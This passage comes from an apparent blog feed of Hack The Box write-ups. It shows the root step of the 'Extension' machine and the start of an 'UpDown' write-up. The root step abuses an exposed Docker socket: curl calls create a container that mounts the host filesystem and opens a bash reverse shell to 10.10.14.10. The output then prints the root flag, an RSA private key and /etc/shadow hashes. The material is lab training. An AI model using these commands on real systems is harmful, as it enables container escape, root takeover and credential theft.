font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">""</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"RepoDigests"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:[</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"mailserver/docker-mailserver@sha256:80d4cff01d4109428c06b33ae8c8af89ebebc689f1fe8c5ed4987b803ee6fa35"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"RepoTags"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:[</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"mailserver/docker-mailserver:latest"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"SharedSize"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:-1</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Size"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:560264926</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"VirtualSize"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:560264926}</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Containers"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:-1</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Created"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:1640059378</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Id"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"sha256:badd93b4fdf82c3fc9f2c6bc12c15da84b7635dc14543be0c1e79f98410f4060"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Labels"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"maintainer"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"maintainers@gitea.io"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"org.opencontainers.image.created"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"2021-12-21T03:59:32Z"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"org.opencontainers.image.revision"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"877040e6521e48c363cfe461746235dce4ab822b"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"org.opencontainers.image.source"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"https://github.com/go-gitea/gitea.git"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"org.opencontainers.image.url"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"https://github.com/go-gitea/gitea"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">}</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"ParentId"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">""</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"RepoDigests"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:[</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"gitea/gitea@sha256:eafb7459a4a86a0b7da7bfde9ef0726fa0fb64657db3ba2ac590fec0eb4cdd0c"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"RepoTags"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:[</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"gitea/gitea:1.15.8"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"SharedSize"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:-1</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Size"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:148275092</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"VirtualSize"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:148275092}</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Containers"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:-1</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Created"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:1640055479</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Id"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"sha256:dd3b2a5dcb48ff61113592ed5ddd762581be4387c7bc552375a2159422aa6bf5"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Labels"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:null</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"ParentId"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">""</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"RepoDigests"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:[</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"mysql@sha256:20575ecebe6216036d25dab5903808211f1e9ba63dc7825ac20cb975e34cfcae"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"RepoTags"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:[</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"mysql:5.6"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"SharedSize"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:-1</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Size"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:302527523</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"VirtualSize"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:302527523}</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Containers"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:-1</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Created"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:1639694686</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Id"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"sha256:0f7cb85ed8af5c33c1ca00367e4b1e4bfae6ec424f52bb04850af73fb19831d7"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Labels"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:null</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"ParentId"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">""</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"RepoDigests"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:[</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"php@sha256:6eb4c063a055e144f4de1426b82526f60d393823cb017add32fb85d79f25b62b"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"RepoTags"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:[</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"php:7.4-fpm-alpine"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"SharedSize"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:-1</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Size"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:82510913</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"VirtualSize"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:82510913}</span></span></code></pre></div>
<p>At the top we find <code>laravel-app_main:latest</code> - lets use that one.</p>
<ol start="2" type="1">
<li>Declare the <code>cmd</code> variable, change IP address and port to fit our needs. This command will be triggered when we start the container.</li>
</ol>
<div class="sourceCode" id="cb35" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb35-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">application@4dae106254bf:/dev/shm$</span> cmd=<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"[</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">/bin/sh</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">,</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">-c</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">,</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">chroot /tmp sh -c </span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\\\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">bash -c 'bash -i &amp;&gt;/dev/tcp/10.10.14.10/4499 0&lt;&amp;1'</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\\\"\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">]"</span></span></code></pre></div>
<ol start="3" type="1">
<li>Create the container and execute command, bind the root filesystem to it, name the container <code>exploit.se_root</code> and execute as detached (-d)</li>
</ol>
<div class="sourceCode" id="cb36" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb36-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">application@4dae106254bf:/dev/shm$</span> curl <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-s</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-X</span> POST <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--unix-socket</span> /app/docker.sock <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-d</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"{</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">Image</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">:</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">laravel-app_main</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">,</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">cmd</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">:</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$cmd</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">,</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">Binds</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">:[</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">/:/tmp:rw</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">]}"</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-H</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'Content-Type: application/json'</span> http://localhost/containers/create<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">?</span>name=exploit.se_root</span></code></pre></div>
<ol start="4" type="1">
<li>Start the container - and trigger the reverse shell</li>
</ol>
<div class="sourceCode" id="cb37" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb37-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">application@4dae106254bf:/dev/shm$</span> curl <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-s</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-X</span> POST <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--unix-socket</span> /app/docker.sock <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"http://localhost/containers/exploit.se_root/start"</span></span></code></pre></div>
<div class="sourceCode" id="cb38" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb38-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  extension nc <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-lvnp</span> 4499</span>
<span id="cb38-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">listening</span> on <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">any</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> 4499 ...</span>
<span id="cb38-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">connect</span> to <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">10.10.14.10</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> from <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">UNKNOWN</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[10.10.11.171]</span> 57132</span>
<span id="cb38-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">bash:</span> cannot set terminal process group <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">1</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">:</span> Inappropriate ioctl for device</span>
<span id="cb38-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">bash:</span> no job control in this shell</span>
<span id="cb38-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root@cbe7b6cef335:/#</span> id</span>
<span id="cb38-7"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">uid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">gid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">groups</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb38-8"></span>
<span id="cb38-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root@cbe7b6cef335:/#</span> cat /root/root.txt</span>
<span id="cb38-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">9bf63e789d19a7507442df8e42d41225</span></span>
<span id="cb38-11"></span>
<span id="cb38-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root@cbe7b6cef335:/#</span> cat /root/.ssh/id_rsa</span>
<span id="cb38-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-----BEGIN</span> RSA PRIVATE KEY-----</span>
<span id="cb38-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">MIIEpAIBAAKCAQEAxhCO2ZdFzdJj6zdL/L38ZGE7OzyRCnJ4qZJyz50X7Ux9JHWT</span></span>
<span id="cb38-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">7kZWP3uElhlwF2WbqsPoS/iUtAjV9keflS/38zfZEp1n/o7g+q8Fw+oxF0s/6fud</span></span>
<span id="cb38-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">hA4KieW/bKnG+aeaC/lBgx5L5EGqsw+RKeBqFmCVi8ySy1SEH4vy7mZzWO4w6Egy</span></span>
<span id="cb38-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ywWyk1gxGBEUuq1xVT0Wvagw+AQtkTJ9jo7wEGA1kAsY0G02hbwelLSPppTx72Ei</span></span>
<span id="cb38-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Pyr2hb9m5pwK6ywz38+4h4dPkyijcbaR0LNNKzDaeBGD78RxbnszHUTXKO/EsQYD</span></span>
<span id="cb38-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">qEYqbFkSMgoMylW8wbxtS1I7T+TW4+tvQzgw9QIDAQABAoIBAQCH384PqX4Cj6Vq</span></span>
<span id="cb38-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">NHoVfcQKnMVEgu1BTHxIYCYRFUTXztQ+0cZU/L2oOTUgv3ytIFBlGpZen75rr3AQ</span></span>
<span id="cb38-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ztvEPa8MlDB/W6p+8EeY0b7TwvJAd6f1/V32vKcwKINkqSfOFtNQCYOOzpbjlMTk</span></span>
<span id="cb38-22"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">p/Y+0ywUA9gzmnjNskIdXiWetHvG8hNBArCU2h9CdlAr2thi3j1j3DR7VBUvuwtw</span></span>
<span id="cb38-23"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">6ny1422XL8xyIMg1qjLh9kFy6Ndif+GmnzuoQW4a18lDflIZQC+03MPRaZUuUbVE</span></span>
<span id="cb38-24"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">pTIDztWjs1+YeVoGPq4nzy+1RsyrxCdA+0+0j6ZK6/++vJPsm+V1/xaModV+XRyg</span></span>
<span id="cb38-25"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">TjsQ0MJBAoGBAOnZ7qtDS/3qSXV6e+kzYcJUTF1d18gXaKfrEm3y09eKJ9mnApTf</span></span>
<span id="cb38-26"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">fW99PlP+wK+eLUbsdxz9xiBxGGuxB+XYclDLIkoIn2308ruBptYMz7LYkcaypsCB</span></span>
<span id="cb38-27"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">XEdi5bY8PlkXICXVhLaFNACydFf0Ve8cj4XG2t1WcBhKbVgCvIKbrzhxAoGBANjS</span></span>
<span id="cb38-28"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">7TmGIIdZarvx4icPboemviW6wbXYY79jGFA+zvQ6DFt3cNoLYKpFfzZoaOXrJyix</span></span>
<span id="cb38-29"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ocFijM0Jc+BX0c13bhCgnjxnZ2/IV3ggeEjKVeuV5wx1+TzdjpR0EAbvWUjd2Q41</span></span>
<span id="cb38-30"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">xSL6kSRI+Po/6Tn9GuzWidMrygWMNT1JhEVVbuLFAoGALDI1+0QyvoBi9cL6XC6L</span></span>
<span id="cb38-31"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0VBhRlwQBg72hpXU29bC1r+TnH0F7eD3MfT3rKQ/AnHgmMDkGiSUJ1l4hhHlLjlk</span></span>
<span id="cb38-32"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">EYTyrA9JIlzi6zEruNSfBGwN0QG+pi9Mo2k7hN+J4QiP2NaryFsQYvlXJ7BT9Wbu</span></span>
<span id="cb38-33"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">cRgOETre4JhgZfvOaNjHmuECgYBnW70cA9Uz0CsyJq8g4ZlV7uWLxMgcsGd0T3/C</span></span>
<span id="cb38-34"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">mP48rANCAuD4AB53bKOkwwbmOz+yhWLPdfQatZvYYOSxZnJAWOC1eLF1NvKDYC8W</span></span>
<span id="cb38-35"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">u+VTZWT7qq1CF3elSuJs++H6+05CGN29u+Y+fs65NIgwTXhtWCPhV2l5VYn3ijkU</span></span>
<span id="cb38-36"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">eBJg5QKBgQChntZ26dV5zBuH+sUBFDD38ATjMKWwKBy4EhogrPP1WPODi7MfPlSW</span></span>
<span id="cb38-37"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">9Pp/C6+rAd91VPcGo6TJD15CDhzTfzffHnjZJ0Nb6HDRL7mw6oimwVTLJttUk8GV</span></span>
<span id="cb38-38"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">QGGCfL85CcYSjPpqQp8ZOml4k/SaSzDUhb06PCuFi+i4afyuQyHAzw==</span></span>
<span id="cb38-39"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-----END</span> RSA PRIVATE KEY-----</span>
<span id="cb38-40"></span>
<span id="cb38-41"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root@cbe7b6cef335:/#</span> cat /etc/shadow</span>
<span id="cb38-42"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root:</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$6$XJ0deONw$c1ag</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/76NHYRVSxMwMeoYPUDsxZDdjC6sX5KKa.QUHi2mjIwN1NlLyRt3QS3E6JjPknuSSOyIUcTTq2SbIXZle/:19157:0:99999:7:::</span></span>
<span id="cb38-43"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">jean:</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$6$2</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ct8z568$.FX4a9sSYGk0QxQiqfiMFIRu.oGdRvGcFgtOz3Hu9bV2i6/Z.IpWlZxZn5iySUJuq9Rqw6oS8yTSFxbAZ4ede.:19156:0:99999:7:::</span></span>
<span id="cb38-44"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">charlie:</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$6$Ai</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">.uOoSz</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$8</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">QB.fXSM7pS2DDpUNBR3Xr3v3MUqlWdSmwEtOjOaRpH73UxGrcxJ/hPkM7h.MfFHM2gzoyHL0.c7s/glcc0Fu.:18995:0:99999:7:::</span></span></code></pre></div>


</section>
</section>

 ]]></description>
  <category>hackthebox</category>
  <category>linux</category>
  <category>web</category>
  <category>fuzzing</category>
  <category>tampering</category>
  <category>xss</category>
  <category>fetch</category>
  <category>tunneling</category>
  <category>shell_exec</category>
  <category>docker</category>
  <guid>https://exploit.se/posts/2022-09-11-htb-writeup-extension/2022-09-11-htb-writeup-extension.html</guid>
  <pubDate>Sun, 11 Sep 2022 00:00:00 GMT</pubDate>
  <media:content url="https://exploit.se/posts/2022-09-11-htb-writeup-extension/images/extension_logo.png" medium="image" type="image/png" height="144" width="144"/>
</item>
<item>
  <title>UpDown - Hack The Box</title>
  <dc:creator>0xPThree </dc:creator>
  <link>https://exploit.se/posts/2022-09-07-htb-writeup-updown/2022-09-07-htb-writeup-updown.html</link>
  <description><![CDATA[ 





<section id="user" class="level1">
<h1>USER</h1>
<section id="step-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1">Step 1</h3>
<div class="sourceCode" id="cb1" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb1-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  updown nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-Pn</span> <span class="at" style="color: #657422;
